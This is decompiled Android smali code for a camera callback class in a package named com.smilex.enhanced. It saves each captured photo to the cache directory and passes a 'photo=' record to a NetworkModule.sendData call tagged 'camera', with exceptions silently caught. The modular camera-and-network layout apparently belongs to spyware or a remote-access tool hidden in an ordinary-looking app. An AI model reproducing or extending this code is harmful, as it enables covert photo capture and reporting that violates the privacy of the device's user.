.class public Lcom/smilex/enhanced/modules/CameraModule$PhotoCallback;
.super Ljava/lang/Object;
.source "CameraModule.java"
.implements Landroid/hardware/Camera$PictureCallback;

.field final synthetic val$context:Landroid/content/Context;

.method public constructor <init>(Landroid/content/Context;)V
    .registers 2
    iput-object p1, p0, Lcom/smilex/enhanced/modules/CameraModule$PhotoCallback;->val$context:Landroid/content/Context;
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V
    return-void
.end method

.method public onPictureTaken([BLandroid/hardware/Camera;)V
    .registers 7
    :try_start
    new-instance v0, Ljava/io/File;
    iget-object v1, p0, Lcom/smilex/enhanced/modules/CameraModule$PhotoCallback;->val$context:Landroid/content/Context;
    invoke-virtual {v1}, Landroid/content/Context;->getExternalCacheDir()Ljava/io/File;
    move-result-object v1
    new-instance v2, Ljava/lang/StringBuilder;
    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V
    const-string v3, "img_"
    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J
    move-result-wide v3
    invoke-virtual {v2, v3, v4}, Ljava/lang/StringBuilder;->append(J)Ljava/lang/StringBuilder;
    const-string v3, ".jpg"
    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
    move-result-object v2
    invoke-direct {v0, v1, v2}, Ljava/io/File;-><init>(Ljava/io/File;Ljava/lang/String;)V
    new-instance v1, Ljava/io/FileOutputStream;
    invoke-direct {v1, v0}, Ljava/io/FileOutputStream;-><init>(Ljava/io/File;)V
    invoke-virtual {v1, p1}, Ljava/io/FileOutputStream;->write([B)V
    invoke-virtual {v1}, Ljava/io/FileOutputStream;->close()V
    new-instance v2, Ljava/lang/StringBuilder;
    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V
    const-string v3, "photo="
    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
    invoke-virtual {v0}, Ljava/io/File;->getAbsolutePath()Ljava/lang/String;
    move-result-object v3
    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
    move-result-object v2
    const-string v3, "camera"
    invoke-static {v3, v2}, Lcom/smilex/enhanced/modules/NetworkModule;->sendData(Ljava/lang/String;Ljava/lang/String;)V
    :try_end
    .catch Ljava/lang/Exception; {:try_start .. :try_end} :catch
    :catch
    invoke-static {}, Lcom/smilex/enhanced/modules/CameraModule;->release()V
    return-void
.end method
